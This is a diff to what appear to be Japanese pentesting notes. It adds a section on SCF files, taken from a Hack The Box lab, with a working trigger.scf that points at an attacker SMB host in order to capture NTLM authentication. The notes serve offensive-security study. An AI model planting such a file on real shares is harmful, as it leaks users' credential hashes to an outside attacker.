@@ -253,9 +253,24 @@
 ## Time
 * ユーザがパスワードを変更した時間は、net userのPassword last setから把握できる
 
+## SCF(Shell Command File) file
+* ターゲットがSCFファイルの存在するsmb共有ディレクトリにアクセスした際、SCFファイル内で指定された攻撃者サーバにntlmでアクセス
+* Htb: Driver
+
+  ```console
+  ┌─[rio@parrot]─[~/Htb/Driver]
+  └──╼ $cat trigger.scf
+  [Shell]
+  Command=2
+  IconFile=\\10.10.14.9\public
+  [Taskbar]
+  Command=ToggleDesktop
+  ```
+
+
 ## Tips  
   | Command | 説明                       |
   | ------- | -------------------------- |
   | dir /q  | ファイルのオーナを表示する |
-  
+
   
